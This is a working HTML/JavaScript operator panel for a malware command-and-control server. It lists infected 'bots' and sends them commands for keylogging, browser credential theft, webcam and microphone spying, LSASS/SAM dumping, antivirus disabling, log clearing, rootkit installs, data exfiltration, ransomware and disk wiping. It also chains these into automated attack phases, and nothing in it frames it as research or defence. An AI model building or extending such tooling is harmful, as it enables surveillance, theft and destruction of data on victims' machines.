<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Server - Complete Command Dashboard</title>
    <style>
        body {
            font-family: 'Consolas', 'Monaco', monospace;
            background-color: #0a0a0a;
            color: #00ff00;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        
        h1, h2 {
            text-align: center;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }
        
        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .bot-card {
            background: #111;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 15px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        
        .bot-card h3 {
            margin: 0 0 10px 0;
            color: #00ff00;
        }
        
        .bot-info {
            font-size: 12px;
            margin: 5px 0;
        }
        
        .command-section {
            margin: 30px 0;
            background: #111;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
        }
        
        .command-category {
            margin: 15px 0;
        }
        
        .command-category h3 {
            color: #00ff00;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 5px;
            margin-bottom: 10px;
        }
        
        .command-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 10px;
        }
        
        button {
            background: #001a00;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px 15px;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.3s;
            font-family: inherit;
            font-size: 12px;
        }
        
        button:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 10px #00ff00;
        }
        
        button:active {
            transform: scale(0.95);
        }
        
        .danger-button {
            border-color: #ff0000;
            color: #ff0000;
        }
        
        .danger-button:hover {
            background: #ff0000;
            color: #000;
            box-shadow: 0 0 10px #ff0000;
        }
        
        .warning-button {
            border-color: #ffaa00;
            color: #ffaa00;
        }
        
        .warning-button:hover {
            background: #ffaa00;
            color: #000;
            box-shadow: 0 0 10px #ffaa00;
        }
        
        .log-section {
            background: #000;
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            font-size: 12px;
            margin-top: 20px;
        }
        
        .log-entry {
            margin: 2px 0;
            font-family: 'Consolas', monospace;
        }
        
        .client-selector {
            margin: 20px 0;
            text-align: center;
        }
        
        select {
            background: #001a00;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 5px 10px;
            font-family: inherit;
            border-radius: 4px;
        }
        
        .phase-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
        }
        
        .shortcuts-help {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #111;
            border: 1px solid #00ff00;
            padding: 10px;
            border-radius: 8px;
            font-size: 12px;
            max-width: 300px;
        }
        
        .loading {
            animation: pulse 1s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üî• C2 SERVER - COMPLETE COMMAND CENTER üî•</h1>
        
        <div class="status-grid" id="botStatus">
            <!-- Bot status cards will be populated here -->
        </div>
        
        <div class="client-selector">
            <label>Target Client: </label>
            <select id="clientSelect">
                <option value="all">All Connected Bots</option>
            </select>
        </div>
        
        <div class="phase-buttons">
            <button onclick="executePhase(1)">Phase 1: Recon</button>
            <button onclick="executePhase(2)">Phase 2: Privilege Escalation</button>
            <button onclick="executePhase(3)">Phase 3: Defense Evasion</button>
            <button onclick="executePhase(4)">Phase 4: Surveillance</button>
            <button onclick="executePhase(5)">Phase 5: Discovery</button>
            <button onclick="executePhase(6)" class="warning-button">Phase 6: Lateral Movement</button>
            <button onclick="executePhase(7)" class="warning-button">Phase 7: Collection</button>
            <button onclick="executePhase(8)" class="danger-button">Phase 8: Exfiltration</button>
            <button onclick="executePhase(9)" class="danger-button">Phase 9: Impact</button>
        </div>
        
        <div class="command-section">
            <h2>Manual Command Execution</h2>
            
            <!-- Basic & Discovery -->
            <div class="command-category">
                <h3>üîç Discovery & Reconnaissance</h3>
                <div class="command-grid">
                    <button onclick="sendCommand('SYSINFO')">System Info</button>
                    <button onclick="sendCommand('PROCESS_LIST')">Process List</button>
                    <button onclick="sendCommand('NETWORK_CONFIG')">Network Config</button>
                    <button onclick="sendCommand('USER_ENUM')">Enumerate Users</button>
                    <button onclick="sendCommand('DOMAIN_INFO')">Domain Info</button>
                    <button onclick="sendCommand('SOFTWARE_ENUM')">Software Inventory</button>
                </div>
            </div>
            
            <!-- Collection -->
            <div class="command-category">
                <h3>üì∏ Collection & Surveillance</h3>
                <div class="command-grid">
                    <button onclick="sendCommand('SCREENSHOT')">Take Screenshot</button>
                    <button onclick="sendCommand('KEYLOG:START')">Start Keylogger</button>
                    <button onclick="sendCommand('KEYLOG:DUMP')">Dump Keylog Data</button>
                    <button onclick="sendCommand('CLIPBOARD')">Capture Clipboard</button>
                    <button onclick="sendCommand('BROWSER_CREDS')">Browser Credentials</button>
                    <button onclick="sendCommand('FILE_SEARCH')">Search Files</button>
                    <button onclick="sendCommand('WEBCAM:CAPTURE')">Webcam Capture</button>
                    <button onclick="sendCommand('MIC:RECORD:START')">Record Microphone</button>
                    <button onclick="sendCommand('SCREEN_RECORD')">Screen Recording</button>
                </div>
            </div>
            
            <!-- Execution -->
            <div class="command-category">
                <h3>‚ö° Command Execution</h3>
                <div class="command-grid">
                    <button onclick="sendCommand('SHELL_EXEC')">Shell Execute</button>
                    <button onclick="sendCommand('POWERSHELL')">PowerShell</button>
                    <button onclick="sendCommand('INJECT_PROCESS')">Process Injection</button>
                    <button onclick="sendCommand('REVERSE_SHELL')">Reverse Shell</button>
                    <button onclick="sendCommand('REMOTE_DESKTOP')">Remote Desktop</button>
                </div>
            </div>
            
            <!-- Persistence -->
            <div class="command-category">
                <h3>üîí Persistence</h3>
                <div class="command-grid">
                    <button onclick="sendCommand('REGISTRY_PERSIST')">Registry Persistence</button>
                    <button onclick="sendCommand('INSTALL_SERVICE')">Install Service</button>
                    <button onclick="sendCommand('SCHEDULED_TASK')">Scheduled Task</button>
                    <button onclick="sendCommand('WMI_PERSIST')">WMI Persistence</button>
                    <button onclick="sendCommand('STARTUP_FOLDER')">Startup Folder</button>
                    <button onclick="sendCommand('BOOTKIT_INSTALL')" class="danger-button">Install Bootkit</button>
                </div>
            </div>
            
            <!-- Lateral Movement -->
            <div class="command-category">
                <h3>üîÄ Lateral Movement</h3>
                <div class="command-grid">
                    <button onclick="sendCommand('PORT_SCAN')">Port Scan</button>
                    <button onclick="sendCommand('SMB_SCAN')">SMB Scan</button>
                    <button onclick="sendCommand('PSEXEC')">PsExec</button>
                    <button onclick="sendCommand('WMI_EXEC')">WMI Execute</button>
                    <button onclick="sendCommand('RDP_EXEC')">RDP Execute</button>
                    <button onclick="sendCommand('PASS_THE_HASH')">Pass The Hash</button>
                    <button onclick="sendCommand('MIMIKATZ')" class="warning-button">Mimikatz</button>
                </div>
            </div>
            
            <!-- Privilege Escalation -->
            <div class="command-category">
                <h3>üìà Privilege Escalation</h3>
                <div class="command-grid">
                    <button onclick="sendCommand('UAC_BYPASS')">UAC Bypass</button>
                    <button onclick="sendCommand('TOKEN_STEAL')">Token Stealing</button>
                    <button onclick="sendCommand('EXPLOIT_SUGGESTER')">Exploit Suggester</button>
                    <button onclick="sendCommand('LSASS_DUMP')" class="warning-button">LSASS Dump</button>
                    <button onclick="sendCommand('SAM_DUMP')" class="warning-button">SAM Dump</button>
                </div>
            </div>
            
            <!-- Defense Evasion -->
            <div class="command-category">
                <h3>üõ°Ô∏è Defense Evasion</h3>
                <div class="command-grid">
                    <button onclick="sendCommand('DISABLE_AV')">Disable AV</button>
                    <button onclick="sendCommand('CLEAR_LOGS')">Clear All Logs</button>
                    <button onclick="sendCommand('TIMESTOMP')">Timestomp Files</button>
                    <button onclick="sendCommand('PROCESS_HOLLOW')">Process Hollowing</button>
                    <button onclick="sendCommand('ROOTKIT_INSTALL')" class="danger-button">Install Rootkit</button>
                    <button onclick="sendCommand('AMSI_BYPASS')">AMSI Bypass</button>
                    <button onclick="sendCommand('ETW_DISABLE')">Disable ETW</button>
                </div>
            </div>
            
            <!-- Network Evasion -->
            <div class="command-category">
                <h3>üåê Advanced Network Evasion</h3>
                <div class="command-grid">
                    <button onclick="sendCommand('TOR_CONNECT')" class="warning-button">TOR Connect</button>
                    <button onclick="sendCommand('TOR_API_CALL')" class="warning-button">TOR API Calls</button>
                    <button onclick="sendCommand('REVERSE_SSH')">Reverse SSH</button>
                    <button onclick="sendCommand('NETCAT_TUNNEL')">Netcat Tunnel</button>
                    <button onclick="sendCommand('SOCAT_RELAY')">Socat Relay</button>
                </div>
            </div>
            
            <!-- Exfiltration -->
            <div class="command-category">
                <h3>üì§ Data Exfiltration</h3>
                <div class="command-grid">
                    <button onclick="sendCommand('STAGE_FILES')">Stage Files</button>
                    <button onclick="sendCommand('COMPRESS_DATA')">Compress Data</button>
                    <button onclick="sendCommand('EXFIL_HTTP')" class="warning-button">Exfil via HTTP</button>
                    <button onclick="sendCommand('EXFIL_DNS')" class="warning-button">Exfil via DNS</button>
                    <button onclick="sendCommand('EXFIL_ICMP')">Exfil via ICMP</button>
                    <button onclick="sendCommand('EXFIL_EMAIL')">Exfil via Email</button>
                    <button onclick="sendCommand('CLOUD_UPLOAD')" class="warning-button">Cloud Upload</button>
                </div>
            </div>
            
            <!-- Impact -->
            <div class="command-category">
                <h3>üíÄ Impact (DANGER ZONE)</h3>
                <div class="command-grid">
                    <button onclick="sendCommand('RANSOMWARE')" class="danger-button">Deploy Ransomware</button>
                    <button onclick="sendCommand('WIPE_DISK')" class="danger-button">Wipe Disk</button>
                    <button onclick="sendCommand('CORRUPT_BOOT')" class="danger-button">Corrupt Boot</button>
                    <button onclick="sendCommand('CRYPTO_MINER')" class="danger-button">Deploy Crypto Miner</button>
                </div>
            </div>
        </div>
        
        <div class="log-section" id="logSection">
            <div class="log-entry">Waiting for activity...</div>
        </div>
        
        <div class="shortcuts-help">
            <strong>Keyboard Shortcuts (Server Console):</strong><br>
            1-5: Attack Phases<br>
            A-Z: Individual Commands<br>
            F1-F12: Special Functions<br>
            H: Help Menu<br>
            ESC: Shutdown
        </div>
    </div>
    
    <script>
        let selectedClient = 'all';
        let statusData = {};
        
        // Update bot status
        function updateStatus() {
            fetch('/api/status')
                .then(response => response.json())
                .then(data => {
                    statusData = data;
                    updateBotDisplay();
                    updateClientSelector();
                })
                .catch(error => console.error('Error fetching status:', error));
        }
        
        function updateBotDisplay() {
            const container = document.getElementById('botStatus');
            container.innerHTML = '';
            
            for (const [clientId, info] of Object.entries(statusData.clients || {})) {
                const card = document.createElement('div');
                card.className = 'bot-card';
                card.innerHTML = `
                    <h3>ü§ñ ${clientId}</h3>
                    <div class="bot-info">Hostname: ${info.hostname || 'Unknown'}</div>
                    <div class="bot-info">User: ${info.username || 'Unknown'}</div>
                    <div class="bot-info">OS: ${info.os || 'Unknown'}</div>
                    <div class="bot-info">Privileges: ${info.privileges || 'Unknown'}</div>
                    <div class="bot-info">Last Seen: ${new Date(info.lastSeen).toLocaleTimeString()}</div>
                    <div class="bot-info">Beacons: ${info.beaconCount || 0}</div>
                `;
                container.appendChild(card);
            }
            
            if (Object.keys(statusData.clients || {}).length === 0) {
                container.innerHTML = '<div class="bot-card"><h3>No bots connected</h3></div>';
            }
        }
        
        function updateClientSelector() {
            const select = document.getElementById('clientSelect');
            const currentValue = select.value;
            
            select.innerHTML = '<option value="all">All Connected Bots</option>';
            
            for (const clientId of Object.keys(statusData.clients || {})) {
                const option = document.createElement('option');
                option.value = clientId;
                option.textContent = clientId;
                select.appendChild(option);
            }
            
            select.value = currentValue;
        }
        
        // Send command
        function sendCommand(command) {
            const target = document.getElementById('clientSelect').value;
            const btn = event.target;
            btn.classList.add('loading');
            
            fetch('/api/command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    clientId: target,
                    command: command
                })
            })
            .then(response => response.json())
            .then(data => {
                addLog(`‚úì Command ${command} sent to ${target}`);
                btn.classList.remove('loading');
            })
            .catch(error => {
                addLog(`‚úó Error sending command: ${error}`);
                btn.classList.remove('loading');
            });
        }
        
        // Execute phase
        function executePhase(phase) {
            const target = document.getElementById('clientSelect').value;
            const phaseCommands = {
                1: ['SYSINFO', 'PROCESS_LIST', 'NETWORK_CONFIG'],
                2: ['UAC_BYPASS', 'TOKEN_STEAL', 'LSASS_DUMP'],
                3: ['DISABLE_AV', 'AMSI_BYPASS', 'ETW_DISABLE'],
                4: ['KEYLOG:START', 'BROWSER_CREDS', 'WEBCAM:CAPTURE'],
                5: ['USER_ENUM', 'DOMAIN_INFO', 'SOFTWARE_ENUM'],
                6: ['PORT_SCAN', 'SMB_SCAN', 'PSEXEC'],
                7: ['SCREENSHOT', 'KEYLOG:DUMP', 'FILE_SEARCH'],
                8: ['COMPRESS_DATA', 'EXFIL_HTTP', 'EXFIL_DNS'],
                9: ['RANSOMWARE', 'CRYPTO_MINER']
            };
            
            const commands = phaseCommands[phase] || [];
            commands.forEach(cmd => sendCommand(cmd));
            addLog(`üöÄ Executing Phase ${phase} on ${target}`);
        }
        
        // Add log entry
        function addLog(message) {
            const logSection = document.getElementById('logSection');
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logSection.appendChild(entry);
            logSection.scrollTop = logSection.scrollHeight;
            
            // Keep only last 100 entries
            while (logSection.children.length > 100) {
                logSection.removeChild(logSection.firstChild);
            }
        }
        
        // Update activity log
        function updateActivityLog() {
            fetch('/api/activity')
                .then(response => response.json())
                .then(data => {
                    data.activities?.forEach(activity => {
                        addLog(activity);
                    });
                })
                .catch(error => console.error('Error fetching activity:', error));
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            updateStatus();
            setInterval(updateStatus, 2000);
            setInterval(updateActivityLog, 1000);
            
            document.getElementById('clientSelect').addEventListener('change', (e) => {
                selectedClient = e.target.value;
                addLog(`Target changed to: ${selectedClient}`);
            });
        });
    </script>
</body>
</html>
